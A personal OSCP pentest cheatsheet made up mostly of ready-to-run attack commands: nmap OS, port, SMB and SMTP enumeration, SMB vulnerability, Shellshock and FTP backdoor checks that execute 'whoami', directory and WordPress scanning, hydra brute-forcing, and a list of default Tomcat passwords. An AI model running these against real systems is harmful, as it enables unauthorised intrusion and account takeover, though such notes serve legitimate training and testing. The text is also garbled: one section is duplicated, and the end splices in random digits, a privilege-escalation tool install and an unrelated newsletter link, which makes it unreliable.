# My pentest cheatsheet 
This is my pentest cheatsheet I made during OSCP journey :)


## Information Gathering

The first step we should always take is 'Information Gathering' about the target.
Initial fingerprinting is mainly done using 'nmap'.

#### TCP Ports : nmap options that fingerprinting OS, Services, Ports information
```bash
sudo nmap -A --privileged -sS <IP>
```

### UDP Ports : nmap options scanning UDP ports
```bash
sudo nmap -A --privileged -sU <IP>
```

#### All Ports : nmap options that scanning all opened ports (By default, nmap does not scan all ports)
```bash
sudo nmap -p0-65535 -sS -sU -v <IP>
```

#### Public Exploits Scanning : Additional script installation required
```bash
# Install : 
git clone https://github.com/scipag/vulscan
ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan

# Execute :     
nmap -sV --script=vulscan/vulscan.nse <IP>
```

<hr/>

#### SMB Enumeration : smb-enum-shares, smb-enum-processes, smb-enum-groups, smb-enum-domains
```bash
sudo nmap --script "smb-enum-* and not(smb-enum-services)" -p 139,445 <IP>
```

#### SMB Fingerprinting
```bash
sudo nmap --script smb-os-discovery -p 139,p445 <IP>
```

#### SMB Vulnerability tests
```bash
sudo nmap -sS --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" \
--script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 -p139,445 <IP>
```
<hr/>

#### HTTP Shellshock : CVE-2014-6271, CVE-2014-7169
```bash
sudo nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=whoami <IP>
```
<hr/>

#### FTP backdoor : ProFTPD 1.3.3c, vsFTPd 2.3.4
```bash
sudo nmap --script "ftp-proftpd-backdoor and ftp-vuln-cve2010-4221 and ftp-proftpd-backdoor" -p 21 --script-args cmd=whoami <IP>
```
<hr/>

#### FTP backdoor : ProFTPD 1.3.3c, vsFTPd 2.3.4
```bash
sudo nmap --script "ftp-proftpd-backdoor and ftp-vuln-cve2010-4221 and ftp-proftpd-backdoor" -p 21 --script-args cmd=whoami <IP>
```
<hr/>

#### nmap : SMTP Enumeration Users
```bash
sudo nmap --script smtp-enum-users.nse smtp-enum-users.methods={EXPN,RCPT,VRFY} -p 25,465,587 <IP>
```
<hr/>

#### dirb : HTTP Directory Bruteforcing
```bash
dirb -r -z 10 http://<URL>
```

#### dirb : HTTP Directory Bruteforing with file extensions
```bash
dirb -r -z 10 -X .jsp,.html,.cgi http://<URL>
```

#### nikto : /cgi-bin finder
```bash
nikto -host http://<URL>
```
#### wpscan : Wordpress Public Exploits Scanner
```bash
wpscan --enumerate ap,at,cb,dbe --url http://<URL>
```
<hr/>

## Default Credentials / Bruteforcing 

#### Apache Tomcat default Credentials
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

#### hydra : HTTP Basicauth Bruteforcing
```bash
hydra -l administrator -V -P /usr/share/wordlists/metasploit/password.lst -t 15 -s <PORT> -f <IP> http-get <PATH>
```

<hr/>

#### nmap : FTP Anonymous / Bruteforcing
```bash
sudo nmap -sV -sC --script "ftp-anon and ftp-brute" -p 21 <IP>
```

<hr/>
123213213213123123123

```
CGO_ENABLED=0 go get -u github.com/liamg/traitor/cmd/traitor
```

- 0/06/21: [Console 58](https://console.substack.com/p/console-58) - Awesome newsletter featuring tools and beta releases for developers.
